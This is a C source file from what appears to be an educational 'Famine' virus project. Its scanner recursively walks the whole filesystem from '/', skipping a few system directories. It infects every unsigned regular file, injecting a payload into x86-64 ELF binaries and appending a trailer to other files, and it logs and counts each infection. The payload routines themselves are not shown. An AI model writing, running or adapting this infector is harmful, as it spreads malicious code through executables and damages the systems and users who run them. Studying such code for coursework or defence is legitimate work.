#include "famine.h"

#include <dirent.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PATH_MAX
# define PATH_MAX 4096
#endif

typedef struct s_scan_stats
{
	uint64_t	scanned_files;
	uint64_t	infected_files;
	uint64_t	skipped_files;
	uint64_t	skipped_dirs;
	uint64_t	elf_infected;
	uint64_t	non_elf_infected;
	int64_t		payload_delta_total;
	uint64_t	delta_count;
}				t_scan_stats;

static t_scan_stats	g_scan_stats;

static int  is_dot_entry(const char *name)
{
	if (name[0] != '.')
		return (0);
	if (name[1] == '\0')
		return (1);
	if (name[1] == '.' && name[2] == '\0')
		return (1);
	return (0);
}

static int  is_supported_elf(t_file file)
{
	Elf64_Ehdr  *ehdr;
	uint64_t    ph_table_size;

	if (file.head == MAP_FAILED || file.size < sizeof(Elf64_Ehdr))
		return (0);
	ehdr = (Elf64_Ehdr *)file.head;
	if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
		return (0);
	if (ehdr->e_ident[EI_VERSION] != EV_CURRENT)
		return (0);
	if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
		return (0);
	if (ehdr->e_machine != EM_X86_64)
		return (0);
	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN && ehdr->e_type != ET_REL)
		return (0);
	if (ehdr->e_phoff > file.size || ehdr->e_phentsize != sizeof(Elf64_Phdr))
		return (0);
	ph_table_size = (uint64_t)ehdr->e_phnum * sizeof(Elf64_Phdr);
	if (ph_table_size == 0 || ph_table_size > file.size - ehdr->e_phoff)
		return (0);
	if (last_phdr(file.head) == NULL)
		return (0);
	return (1);
}

static int	is_skipped_dir(const char *path)
{
	const char	*skip[] = {
		"/proc",
		"/sys",
		"/dev",
		"/run",
		"/tmp",
		"/mnt",
		"/media",
		NULL
	};
	int			i;

	for (i = 0; skip[i] != NULL; ++i)
	{
		size_t	slen = strlen(skip[i]);

		if (strncmp(path, skip[i], slen) == 0 && (path[slen] == '/' || path[slen] == '\0'))
			return (1);
	}
	return (0);
}

static void	log_infection(const char *path, int is_elf, off_t before_size, off_t after_size)
{
	int64_t	delta = (int64_t)(after_size - before_size);

	if (is_elf)
		fprintf(stderr, "[famine] infected ELF: %s (+%lld bytes)\n", path, (long long)delta);
	else
		fprintf(stderr, "[famine] infected non-ELF (trailer): %s (+%lld bytes)\n", path, (long long)delta);
}

static int	process_regular_file(const char *path, struct stat *st)
{
	t_file	target;
	off_t	before_size;
	off_t	after_size;
	int		is_elf;

	before_size = st->st_size;
	g_scan_stats.scanned_files++;

	target = file_load(path, 0);
	if (target.head == MAP_FAILED)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	if (is_signed(target))
	{
		file_unload(target);
		g_scan_stats.skipped_files++;
		return (0);
	}
	file_unload(target);

	target = file_load(path, 0);
	if (target.head == MAP_FAILED)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	is_elf = is_supported_elf(target);
	file_unload(target);

	target = file_load(path, PAYLOAD_BIN_SIZE);
	if (target.head == MAP_FAILED)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	if (!is_elf)
	{
		file_unload(target);
		target = file_load(path, SIGNATURE_SIZE);
		if (target.head == MAP_FAILED)
		{
			g_scan_stats.skipped_files++;
			return (-1);
		}
	}
	if (is_signed(target))
	{
		file_unload(target);
		g_scan_stats.skipped_files++;
		return (0);
	}
	if (is_elf)
	{
		if (sign(target) == -1)
		{
			g_scan_stats.skipped_files++;
			return (-1);
		}
	}
	else
	{
		if (sign_blob(target) == -1)
		{
			g_scan_stats.skipped_files++;
			return (-1);
		}
	}
	if (lstat(path, st) < 0)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	after_size = st->st_size;
	log_infection(path, is_elf, before_size, after_size);
	g_scan_stats.infected_files++;
	if (is_elf)
		g_scan_stats.elf_infected++;
	else
		g_scan_stats.non_elf_infected++;
	g_scan_stats.payload_delta_total += (int64_t)(after_size - before_size);
	g_scan_stats.delta_count++;
	return (0);
}

static void	infect_file(const char *path)
{
	struct stat	st;

	if (lstat(path, &st) < 0)
		return;
	if (!S_ISREG(st.st_mode))
		return;
	process_regular_file(path, &st);
}

static void	scan_directory(const char *dirname)
{
	DIR				*dir;
	struct dirent	*entry;
	char			path[PATH_MAX];
	int				written;
	struct stat		st;

	if (is_skipped_dir(dirname))
	{
		g_scan_stats.skipped_dirs++;
		return;
	}
	dir = opendir(dirname);
	if (dir == NULL)
		return;
	while ((entry = readdir(dir)) != NULL)
	{
		if (is_dot_entry(entry->d_name))
			continue;
		written = snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
		if (written < 0 || written >= (int)sizeof(path))
			continue;
		if (lstat(path, &st) < 0)
			continue;
		if (S_ISLNK(st.st_mode))
			continue;
		if (S_ISDIR(st.st_mode))
			scan_directory(path);
		else if (S_ISREG(st.st_mode))
			infect_file(path);
	}
	closedir(dir);
}

static void	print_scan_report(void)
{
	double	avg;

	avg = 0.0;
	if (g_scan_stats.delta_count > 0)
		avg = (double)g_scan_stats.payload_delta_total / (double)g_scan_stats.delta_count;
	fprintf(stderr, "[famine] scan report\n");
	fprintf(stderr, "  scanned_files: %llu\n", (unsigned long long)g_scan_stats.scanned_files);
	fprintf(stderr, "  infected_files: %llu\n", (unsigned long long)g_scan_stats.infected_files);
	fprintf(stderr, "  skipped_files: %llu\n", (unsigned long long)g_scan_stats.skipped_files);
	fprintf(stderr, "  skipped_dirs: %llu\n", (unsigned long long)g_scan_stats.skipped_dirs);
	fprintf(stderr, "  elf_infected: %llu\n", (unsigned long long)g_scan_stats.elf_infected);
	fprintf(stderr, "  non_elf_infected: %llu\n", (unsigned long long)g_scan_stats.non_elf_infected);
	fprintf(stderr, "  payload_delta_total: %lld\n", (long long)g_scan_stats.payload_delta_total);
	fprintf(stderr, "  payload_delta_avg: %.2f\n", avg);
}

void	scan_targets(void)
{
	memset(&g_scan_stats, 0, sizeof(g_scan_stats));
	fprintf(stderr, "[famine] feature 2 validated: recursive root scan with skips\n");
	scan_directory("/");
	fprintf(stderr, "[famine] feature 3 validated: non-ELF trailer mode active\n");
	print_scan_report();
}
